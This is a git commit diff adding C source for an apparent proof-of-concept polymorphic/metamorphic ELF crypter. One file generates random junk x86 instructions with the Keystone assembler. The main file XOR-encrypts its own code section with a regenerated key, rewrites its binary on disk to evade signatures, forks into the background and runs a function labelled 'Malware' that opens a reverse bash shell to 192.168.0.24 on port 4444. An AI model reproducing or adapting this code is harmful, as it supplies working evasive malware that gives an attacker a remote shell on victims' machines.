8bf04b7e9224f6163bcea7b5cbd0946b4fd2adc2
Edouard SENGEISSEN <edouard.sengeissen@epitech.eu>
2020-07-09 19:15:52 +0200

    polymeta : v0.1

---
+++ PolyMetamorphic/src/gen_bytes.c
@@ -0,0 +1,178 @@
+/*
+** EPITECH PROJECT, 2020
+** Linux-ELF
+** File description:
+** gen_bytes
+*/
+
+#include "tmp_header.h"
+
+const char *reg_tab[] = {"RAX", "RBX", "RCX", "RDX", "RSI", "RDI", "RBP", "RSP", NULL};
+const int instr_size[6] = {8, 2, 2, 2, 2, 3};
+
+int (*op_tab[6])(const char *, int, char **) = {
+    &op_cmp_jmp,
+    &op_inc_dec,
+    &op_nop,
+    &op_neg,
+    &op_not,
+    &op_shl
+};
+
+int op_cmp_jmp(const char *reg, int bit_nbr, char **code)
+{
+    char new[13];
+    sprintf(new, "CMP %s,%s;", reg, reg);
+    size_t size_instr = size_calc(new);
+    if (bit_nbr - (int)size_instr < 0)
+        return 0;
+    *code = realloc(*code, strlen(*code) + 13);
+    strcat(*code, new);
+    return size_instr;
+}
+
+int op_inc_dec(const char *reg, int bit_nbr, char **code)
+{
+    char new[17];
+    sprintf(new, "INC %s;DEC %s;", reg, reg);
+    size_t size_instr = size_calc(new);
+    if (bit_nbr - (int)size_instr < 0)
+        return 0;
+    *code = realloc(*code, strlen(*code) + 17);
+    strcat(*code, new);
+    return size_instr;
+}
+
+int op_nop(const char *reg, int bit_nbr, char **code)
+{
+    char new[5];
+    sprintf(new, "NOP;");
+    size_t size_instr = size_calc(new);
+   if (bit_nbr - (int)size_instr < 0)
+        return 0;
+    *code = realloc(*code, strlen(*code) + 5);
+    strcat(*code, new);
+    return size_instr;
+}
+
+int op_not(const char *reg, int bit_nbr, char **code)
+{
+    char new[17];
+    sprintf(new, "NOT %s;NOT %s;", reg, reg);
+    size_t size_instr = size_calc(new);
+    if (bit_nbr - (int)size_instr < 0)
+        return 0;
+    *code = realloc(*code, strlen(*code) + 17);
+    strcat(*code, new);
+    return size_instr;
+}
+
+int op_neg(const char *reg, int bit_nbr, char **code)
+{
+    char new[17];
+    sprintf(new, "NEG %s;NEG %s;", reg, reg);
+    size_t size_instr = size_calc(new);
+    if (bit_nbr - (int)size_instr < 0)
+        return 0;
+    *code = realloc(*code, strlen(*code) + 17);
+    strcat(*code, new);
+    return size_instr;
+}
+
+int op_shl(const char *reg, int bit_nbr, char **code)
+{
+    char new[11];
+    sprintf(new, "SHL %s,0;", reg);
+    size_t size_instr = size_calc(new);
+    if (bit_nbr - (int)size_instr < 0)
+        return 0;
+    *code = realloc(*code, strlen(*code) + 11);
+    strcat(*code, new);
+    return size_instr;
+}
+
+unsigned char *gen_bit(int bit_nbr)
+{
+    int rdm = 0;
+    int rdm_reg = 0;
+    size_t size;
+    char *code = strdup("");
+    unsigned char *gen_code = NULL;
+
+    while (bit_nbr > 0) {
+        rdm = rand() % 6;
+        rdm_reg = rand()% 8;
+        if ((size = op_tab[rdm](reg_tab[rdm_reg], bit_nbr, &code)))
+            bit_nbr -= size;
+    }
+    gen_code = encoder(code);
+    return gen_code;
+}
+
+unsigned char *encoder(char *code)
+  {
+      ks_engine *ks;
+      ks_err err;
+      size_t count;
+      unsigned char *encode;
+      unsigned char *encode_cpy;
+      size_t size;
+
+      err = ks_open(KS_ARCH_X86, KS_MODE_64, &ks);
+      if (err != KS_ERR_OK) {
+          printf("ERROR: failed on ks_open(), quit\n");
+          return (NULL);
+      }
+      if (ks_asm(ks, code, 0, &encode, &size, &count) != KS_ERR_OK) {
+          printf("ERROR: ks_asm() failed & count = %lu, error = %u\n",
+		         count, ks_errno(ks));
+      } else {
+          for (size_t i = 0; i < size; i++)
+              printf("%02x ", encode[i]);
+          printf("\n(Instructions : %s)", code);
+          printf("\nCompiled: %lu bytes, statements: %lu\n", size, count);
+      }
+      encode_cpy = malloc(sizeof(char) * (size + 1));
+      for (int i = 0; i < size ; i++) {
+          encode_cpy[i] = encode[i];
+      }
+      encode_cpy[size] = 0;
+      ks_free(encode);
+      ks_close(ks);
+      return (encode_cpy);
+  }
+
+int size_calc(char *code)
+  {
+      ks_engine *ks;
+      ks_err err;
+      size_t count;
+      unsigned char *encode;
+      size_t size;
+
+      err = ks_open(KS_ARCH_X86, KS_MODE_64, &ks);
+      if (err != KS_ERR_OK) {
+          printf("ERROR: failed on ks_open(), quit\n");
+          return -1;
+      }
+      if (ks_asm(ks, code, 0, &encode, &size, &count) != KS_ERR_OK)
+          printf("ERROR: ks_asm() failed & count = %lu, error = %u\n",
+		         count, ks_errno(ks));
+      ks_free(encode);
+      ks_close(ks);
+      return (size);
+  }
+
+// int main(int ac, char **av)
+// {
+//     int bit_nbr = 0;
+//     srand(time(NULL) * (intptr_t)av);
+
+//     if (ac != 2) {
+//         printf("Usage: %s {Nombre_de_bit}", av[0]);
+//         return (1);
+//     }
+//     if ((bit_nbr = atoi(av[1])) != 0)
+//         gen_bit(bit_nbr);
+//     return (0);
+// }
---
+++ PolyMetamorphic/src/main.c
@@ -0,0 +1,178 @@
+/*
+** PoC PROJECT, 2020
+** Whitecomet-Research
+** File description:
+** main
+*/
+
+#include "PoCrypt.h"
+#include "tmp_header.h"
+
+static int get_file_size (int fd)
+{
+    struct stat _infos;
+
+    if (fstat(fd, &_infos) != 0)
+        DIE("fstat");
+    return _infos.st_size;
+}
+
+/* Read binary data and store it */
+static crypter_t *read_bin(const char *name)
+{
+    int fd;
+    crypter_t *crypter;
+
+    if ((crypter = malloc(sizeof(crypter_t))) == NULL)
+        DIE1("malloc:");
+    crypter->fname = strdup(name);
+    if ((fd = open(name, O_RDONLY, 0)) < 0)
+        DIE("open");
+    crypter->bin_len = get_file_size(fd);
+    crypter->bin_content = malloc(crypter->bin_len);
+    if (read(fd, crypter->bin_content, crypter->bin_len) == -1)
+        DIE("read");
+    close(fd);
+    return crypter;
+}
+
+CRYPTED(CODE) void save(crypter_t *crypt)
+{
+    int fd;
+
+    /* Delete the file so we can write a modified image */
+    if (unlink(crypt->fname) < 0)
+        DIE("unlink:");
+    if ((fd = open(crypt->fname, O_CREAT | O_TRUNC | O_RDWR,S_IRWXU)) == -1)
+        DIE("open:");
+    if (write(fd, crypt->bin_content, crypt->bin_len) < 0)
+        DIE("write:");
+    close (fd);
+  return;
+}
+
+static char *generate_key (unsigned char *p, int size)
+{
+    int i;
+
+    for (i = 0; i < size; i++){
+        p[i] = (rand() % 255);
+        key[i] = p[i];
+    }
+    return key;
+}
+
+/* Malware */
+CRYPTED(CODE) void payload(void)
+{
+    int sockt;
+    int port = 4444;
+    struct sockaddr_in revsockaddr;
+
+    sockt = socket(AF_INET, SOCK_STREAM,0);
+    revsockaddr.sin_family = AF_INET;
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("192.168.0.24");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr,
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"/bin/bash", NULL};
+    execve("/bin/bash", argv, NULL);
+}
+
+static void xor_segment(unsigned char *seg_start, int seg_len)
+{
+    int i = 0;
+    int j = 0;
+
+    for (;seg_len--; i++) {
+        seg_start[i] ^= (key[i] - 1);
+    }
+}
+void replace_junk(unsigned char **orig, const char *name, int size);
+static void decode_and_crypt(crypter_t *crypter)
+{
+    Elf64_Shdr *section = elfi_find_section(crypter->bin_content, CODE);
+    int key_offset = -1;
+    int key_len = -1;
+
+    /* Get ELF infos : */
+    /* ELF - On crypted code */
+    if (section == NULL)
+        DIE("elfi_find_section bin")
+    crypter->seg_offset = section->sh_offset;
+    crypter->seg_len = section->sh_size;
+    key_len = crypter->seg_len; /* Because One Time Pad */
+
+    /* ELF - On key */
+    section = elfi_find_section(crypter->bin_content, KEY);
+    if (section == NULL)
+        DIE("elfi_find_section key");
+
+    key_offset = section->sh_offset;
+
+    /* Give W permission on .unix && crypt payload in binary + memory && Remove W permission */
+    change_section_permissions(crypter->seg_offset, crypter->seg_len, true);
+    xor_segment(BIN_START + crypter->seg_offset, crypter->seg_len);
+    xor_segment(crypter->bin_content + crypter->seg_offset, crypter->seg_len);
+    change_section_permissions(crypter->seg_offset, crypter->seg_len, false);
+
+    /* Give W permission on .PoC_key && rewrite key in binary && Remove W perm on .PoC_key*/
+    change_section_permissions(key_offset, crypter->seg_len, true);
+    generate_key(crypter->bin_content + key_offset, crypter->seg_len);
+    change_section_permissions(  key_offset, crypter->seg_len, false);
+
+    // ! C'est ici que c'est décrypté , donc on change les instructions ici
+    replace_junk(&(crypter->bin_content), NULL, crypter->bin_len);
+
+    /* Overwrite */
+    xor_segment(crypter->bin_content + crypter->seg_offset, crypter->seg_len);
+    save(crypter);
+}
+
+void remove_first_time(crypter_t *crypter)
+{
+    Elf64_Shdr *section = elfi_find_section(crypter->bin_content, ".unixb");
+    int offset = section ? (int)section->sh_offset : -1;
+    char *boolean_pos = crypter->bin_content + offset;
+
+    write(1, "Program running for the first time.\n", 36);
+    if (section == NULL){
+        write(1, "Big problem in your program man\n", 32);
+        return;
+    }
+    for (int i = 0; i < 4; i++)
+        boolean_pos[i] = 0;
+    for (int i = 0 ; i < CRYPTED_FUNC_SIZE; i++)
+        key[i] = 1;
+}
+
+int run_alone(void)
+{
+    pid_t sid = setsid();
+
+    if (sid < 0) exit(84);
+
+    signal(SIGCHLD, SIG_IGN);
+    signal(SIGHUP, SIG_IGN);
+}
+
+/* main */
+int main(int ac, char const * const *av)
+{
+    crypter_t *crypter = read_bin(av[0]);
+
+    if (first_time == true) /* Init a first-time key */
+        remove_first_time(crypter);
+    srand(time(NULL) * (intptr_t)crypter);  /* Make things really random */
+    decode_and_crypt(crypter); /* Decode 😇 */
+    if(fork())
+        exit(0);
+    payload(); /* 😈 */
+    run_alone();
+    return (0);
+}
